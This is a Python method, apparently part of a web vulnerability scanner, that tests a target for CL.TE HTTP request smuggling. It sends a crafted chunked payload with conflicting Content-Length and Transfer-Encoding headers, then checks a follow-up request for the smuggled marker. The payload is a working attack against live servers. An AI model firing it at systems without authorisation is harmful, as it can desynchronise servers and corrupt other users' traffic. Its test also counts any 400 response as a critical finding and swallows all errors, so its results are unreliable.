    def test_smuggling_cl_te(self):
        """CL.TE HTTP request smuggling (front-end CL, back-end TE)."""
        if not self.deep: return
        self._print("[*]", "CL.TE smuggling...", "INFO")
        try:
            url = urljoin(self.target, "/")
            marker = hashlib.md5(
                (self.host + "clte").encode()).hexdigest()[:8]
            payload = ("0\r\n\r\nG" + marker +
                       " POST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nx=")
            r1 = self._request("POST", url, data=payload,
                              headers={"Content-Length": str(len(payload)),
                                       "Transfer-Encoding": "chunked"},
                              timeout=8)
            if r1 is None: return
            time.sleep(1)
            r2 = self._get(url, timeout=8)
            if r2 is None: return
            if marker in (r2.text or "") or r2.status_code == 400:
                self._add_vuln("HTTP Request Smuggling (CL.TE)",
                               "CRITICAL", url,
                               "CL.TE desync detected - back-end interprets chunked after CL: " + (r2.text or "")[:200],
                               method="POST")
        except Exception:
            pass

